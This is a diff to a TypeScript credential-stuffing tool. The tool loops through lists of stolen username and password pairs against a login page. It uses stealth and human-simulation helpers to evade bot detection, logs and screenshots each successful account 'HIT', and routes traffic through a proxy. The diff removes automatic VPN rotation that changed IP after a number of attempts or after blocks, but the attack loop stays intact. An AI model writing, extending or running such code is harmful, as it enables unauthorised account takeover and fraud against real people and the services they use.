@@ -7,7 +7,7 @@ import * as fs from 'fs';
 import * as path from 'path';
 import { STEALTH_LAUNCH_ARGS, getStealthContextOptions, injectDeepStealth, simulateHuman, humanType, randDelay } from './stealth-utils';
 import { scanLogin, ScanResult } from './scanner';
-import { rotate, recordSuccess, recordFail, sudoAvailable, PROXY_URL } from './vpn-rotator';
+
 
 // ─── Types ────────────────────────────────────────────────────────────────────
 
@@ -185,29 +185,7 @@ export async function runLoginAuto(
     console.log(`[auto] Scanner found ${selectors.length} selector(s)`);
   }
 
-  // ── VPN init ────────────────────────────────────────────────────────────────
-  const hasSudo = sudoAvailable();
-  if (!hasSudo) {
-    console.warn('[auto] sudo not pre-authorised — VPN rotation disabled. Run: sudo -v');
-    console.warn('[auto] Continuing without VPN rotation...');
-  }
-
   let activeTunnelName: string | null = null;
-  const failedTunnels = new Set<string>();
-
-  async function ensureVpn(): Promise<string | null> {
-    if (!hasSudo) return null;
-    try {
-      activeTunnelName = await rotate(failedTunnels);
-      return activeTunnelName;
-    } catch (e: any) {
-      console.error('[auto] VPN rotation failed:', e.message);
-      return null;
-    }
-  }
-
-  // Initial VPN setup
-  await ensureVpn();
 
   // ── Stat tracking ────────────────────────────────────────────────────────────
   let attempted = 0;
@@ -218,14 +196,7 @@ export async function runLoginAuto(
   for (let i = 0; i < creds.length; i++) {
     const { username, password } = creds[i];
 
-    // Rotate VPN every N attempts
-    if (hasSudo && attempted > 0 && attempted % rotateEvery === 0) {
-      console.log(`[auto] Rotating VPN after ${rotateEvery} attempts...`);
-      if (activeTunnelName) failedTunnels.add(activeTunnelName); // force rotation to new tunnel
-      await ensureVpn();
-    }
-
-    const proxyUrl = activeTunnelName ? PROXY_URL : (process.env.PROXY_URL || undefined);
+    const proxyUrl = process.env.PROXY_URL || undefined;
 
     console.log(`\n[auto] [${i + 1}/${creds.length}] ${username} | tunnel: ${activeTunnelName ?? 'none'}`);
 
@@ -262,7 +233,6 @@ export async function runLoginAuto(
 
       if (outcome.success) {
         console.log(`[auto] ✓ HIT: ${username}:${password} (${outcome.reason})`);
-        if (activeTunnelName) recordSuccess(activeTunnelName, attempt.durationMs);
         succeeded++;
         hits.push(attempt);
         await page.screenshot({ path: `./hit_${username.replace(/[^a-z0-9]/gi, '_')}_${Date.now()}.png`, fullPage: true });
@@ -276,12 +246,7 @@ export async function runLoginAuto(
       attempt.durationMs = Date.now() - t0;
 
       if (isBlockError(err.message ?? '')) {
-        console.warn('[auto] Block/connection error — rotating VPN...');
-        if (activeTunnelName) {
-          recordFail(activeTunnelName);
-          failedTunnels.add(activeTunnelName);
-        }
-        await ensureVpn();
+        console.warn('[auto] Block/connection error detected.');
       }
     }
 
